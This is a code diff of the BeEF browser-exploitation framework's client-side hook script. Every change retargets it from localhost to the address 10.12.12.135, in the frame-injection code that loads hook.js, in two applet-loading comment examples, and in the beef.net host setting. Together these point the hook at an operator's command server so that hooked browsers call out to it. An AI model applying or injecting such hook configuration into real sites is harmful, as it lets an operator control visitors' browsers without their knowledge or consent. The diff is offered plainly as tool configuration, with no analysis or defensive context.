@@ -4595,7 +4595,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'https://127.0.0.1:3000/hook.js';
+        script.src = 'https://10.12.12.135:3000/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -6545,9 +6545,9 @@ beef.dom = {
     /**
      * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
      * example usage in the code, using a JAR archive (recommended and faster):
-     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://10.12.12.135:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
      * example usage in the code, using codebase:
-     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://10.12.12.135:3000/', null, null);
      * @params: {String} id: reference identifier to the applet.
      * @params: {String} code: name of the class to be loaded. For example, beef.class.
      * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
@@ -6980,7 +6980,7 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "127.0.0.1",
+    host: "10.12.12.135",
     port: "3000",
     hook: "/hook.js",
     httpproto: "https",
